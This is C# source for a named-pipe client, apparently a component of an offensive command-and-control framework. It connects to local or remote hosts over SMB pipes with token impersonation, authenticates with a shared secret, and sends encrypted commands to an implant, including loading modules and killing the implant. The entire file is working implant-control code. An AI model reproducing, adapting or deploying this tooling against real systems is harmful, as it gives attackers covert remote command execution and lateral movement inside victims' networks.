using System;
using System.IO.Pipes;
using System.IO;
using System.Text;
using System.Security.Principal;

public static class PBind
{
    private static volatile bool _pbindConnected;
    private static volatile NamedPipeClientStream _pipeStream;
    private static volatile StreamReader _pipeReader;
    private static volatile StreamWriter _pipeWriter;
    private static string _encryptionKey = "";
    private static readonly object LOCK = new object();

    public static void Main(string[] args)
    {
        try
        {
            if (args.Length == 5 && args[0].ToLower() == "start") // If in format 'Start <hostname> <pipename> <secret> <key>'
            {
                Start(args);
            }
            else if (_pbindConnected && _pipeStream.IsConnected)
            {
                HandleCommand(args);
            }
            else if (_pbindConnected && !_pipeStream.IsConnected)
            {
                Console.WriteLine("[PBind Client][-] Pipe has disconnected, re-run pbind-connect to reconnect");
                _pbindConnected = false;
            }
            else
            {
                Console.WriteLine("[PBind Client][-] PBind not connected");
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"PBind error: {e}");
        }
    }

    private static void HandleCommand(string[] args)
    {
        var taskIdAndCommand = args[0].Trim();
        var taskId = taskIdAndCommand.Substring(0, 5);
        var command = taskIdAndCommand.Substring(5);

#if DEBUG
        Utils.TrimmedPrint("[PBind Client][*] Got encoded taskIdAndCommand: ", taskIdAndCommand);
        Utils.TrimmedPrint("[PBind Client][*] Got encoded command: ", command);
#endif

        if (!command.StartsWith("load-module") && !command.StartsWith("kill-implant"))
        {
#if DEBUG
            Console.WriteLine("[PBind Client][*] Not a load-module or kill-implant, decoding entire command");
#endif
            var data = Convert.FromBase64String(command);
            command = Encoding.UTF8.GetString(data);
        }

        var newCommand = taskId + command;
#if DEBUG
        Utils.TrimmedPrint("New command: ", newCommand);
#endif
        IssueCommand(newCommand);

        if (command == "kill-implant" || command == "pbind-unlink")
        {
            _pbindConnected = false;
            _pipeStream.Dispose();
        }
    }

    private static void Start(string[] args)
    {
        if (_pbindConnected && _pipeStream.IsConnected)
        {
            try
            {
                _pipeStream.WaitForPipeDrain();
                Console.WriteLine("[PBind Client][-] PBind already connected");
            }
            catch (Exception)
            {
                _pbindConnected = false;
                _encryptionKey = args[4];
                Console.WriteLine($"[PBind Client][+] Connecting to: {args[1]} pipe: {args[2]} with secret {args[3]} and key {_encryptionKey}");
                _pbindConnected = Connect(args[1], args[2], args[3], _encryptionKey);
            }
        }
        else
        {
            _pbindConnected = false;
            _encryptionKey = args[4];
            Console.WriteLine($"[PBind Client][+] Connecting to: {args[1]} pipe: {args[2]} with secret {args[3]} and key {_encryptionKey}");
            _pbindConnected = Connect(args[1], args[2], args[3], _encryptionKey);
        }
    }

    private static bool Connect(string hostname, string pipeName, string secret, string encryptionKey)
    {
        if (hostname.ToLower() == "127.0.0.1" || hostname.ToLower() == "localhost")
        {
            _pipeStream = new NamedPipeClientStream(pipeName);
        }
        else
        {
            _pipeStream = new NamedPipeClientStream(hostname, pipeName, PipeDirection.InOut, PipeOptions.None, TokenImpersonationLevel.Impersonation);
        }

        _pipeReader = new StreamReader(_pipeStream);
        _pipeWriter = new StreamWriter(_pipeStream);

        try
        {
            _pipeStream.Connect(30000);
            _pipeWriter.AutoFlush = true;
        }
        catch (Exception e)
        {
            Console.WriteLine($"[PBind Client][-] Error connecting to pipe: {e}");
            return false;
        }

        if (_pipeStream.CanWrite)
        {
            _pipeWriter.WriteLine(secret);
        }
        else
        {
            Console.WriteLine("[PBind Client][-] Cannot write to pipe");
            return false;
        }

        if (_pipeStream.CanRead)
        {
            try
            {
                var clientInfo = Encryption.Decrypt(encryptionKey, _pipeReader.ReadLine());
                if (!clientInfo.StartsWith("PBind-Connected"))
                {
                    Console.WriteLine($"[PBind Client][-] Error - decrypted response on pipe connect was invalid: {clientInfo}");
                    return false;
                }

                Console.WriteLine(clientInfo);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[PBind Client][-] Error decrypting response: {e}");
                return false;
            }
        }

        Console.WriteLine("[PBind Client][-] Cannot read from pipe");
        return false;
    }

    private static void IssueCommand(string command)
    {
        if (!_pipeStream.IsConnected)
        {
            _pbindConnected = false;
            Console.WriteLine("$[PBind Client][-] The PBind pipe is no longer connected");
            _pipeReader.Dispose();
            _pipeWriter.Dispose();
            _pipeStream.Dispose();
            return;
        }

        lock (LOCK)
        {
            try
            {
                var line = _pipeReader.ReadLine();

                while (string.IsNullOrWhiteSpace(line))
                {
                    line = _pipeReader.ReadLine();
                }

#if DEBUG
                Utils.TrimmedPrint("[PBind Client][*] Got encrypted base64 encoded response: ", line);
#endif

                var response = Encryption.Decrypt(_encryptionKey, line);
#if DEBUG
                Utils.TrimmedPrint("[PBind Client][*] Decrypted response from pipe: ", response);
#endif
                if (response != "COMMAND")
                {
#if DEBUG
                    Utils.TrimmedPrint("[PBind Client][-] Error, received unexpected response on pipe: ", response);
#endif
                    throw new Exception("0x1001");
                }
#if DEBUG
                Utils.TrimmedPrint("[PBind Client][*] Issuing command: ", command);
#endif

                if (command == "kill-implant")
                {
                    command = "exit";
                }

                var encryptedCommand = Encryption.Encrypt(_encryptionKey, command);
                _pipeWriter.WriteLine(encryptedCommand);

#if DEBUG
                Console.WriteLine("[PBind Client][*] Waiting for command response");
#endif
                line = _pipeReader.ReadLine();
                if (string.IsNullOrWhiteSpace(line))
                {
#if DEBUG
                    Console.WriteLine("[PBind Client][-] Got empty response");
#endif
                    Console.WriteLine();
                    return;
                }
#if DEBUG
                Utils.TrimmedPrint("[PBind Client][*] Got encrypted encoded response: ", line);
#endif
                response = Encryption.Decrypt(_encryptionKey, line);

                Console.WriteLine(response);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[PBind Client][-] Error in PBind Command Loop: {e}");
            }
        }
    }
}